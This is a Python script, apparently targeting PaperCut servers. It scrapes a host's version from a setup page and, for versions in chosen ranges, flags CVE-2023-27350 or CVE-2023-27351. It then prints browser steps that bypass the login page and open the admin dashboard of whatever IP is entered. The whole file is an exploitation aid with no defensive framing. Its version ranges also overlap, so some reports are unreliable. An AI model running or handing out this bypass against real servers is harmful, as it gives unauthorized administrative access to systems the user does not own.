import requests
from bs4 import BeautifulSoup
import re

def is_valid_ip(ip):
    """
    Check if a string is a valid IP address.
    """
    pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    return bool(pattern.match(ip))

def get_version_number(soup):
    """
    Find the version number from a BeautifulSoup object representing the HTML of a web page.
    """
    text_div = soup.find('div', class_='text')
    version_span = None
    for span in text_div.find_all('span'):
        version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
        if version_match:
            version_span = span
            break
    if version_span is None:
        return None
    return version_span.text.strip()

def check_vulnerabilities(ip):
    """
    Check if a web application at the given IP address is vulnerable to known CVEs.
    """
    if not is_valid_ip(ip):
        print('Invalid IP address')
        return
    
    url = f'http://{ip}:9191/app?service=page/SetupCompleted'
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f'Error connecting to {url}: {e}')
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    version_str = get_version_number(soup)
    
    if version_str is None:
        print('Could not find version number')
        return
    
    print(f'Web application version: {version_str}')
    
    try:
        version_tuple = tuple(map(int, version_str.split('.')))
    except ValueError:
        print('Invalid version format')
        return
    
    if (8, 0) <= version_tuple <= (22, 0, 4):
        print('Vulnerable to CVE-2023-27350')
        print(f"Step 1: Visit this URL first in your browser: {url}")
        print(f"Step 2: Visit this URL in your browser to bypass the login page: http://{ip}:9191/app?service=page/Dashboard")
    elif (10, 0) <= version_tuple <= (25, 0, 0):
        print('Vulnerable to CVE-2023-27351')
        print(f"Step 1: Visit this URL first in your browser: {url}")
        print(f"Step 2: Visit this URL in your browser to bypass the login page: http://{ip}:9191/app?service=page/Dashboard")
    else:
        print('Web application is not vulnerable to known CVEs')
        
if __name__ =="__main__":
    ip = input("Enter the IP address: ")
    check_vulnerabilities(ip)
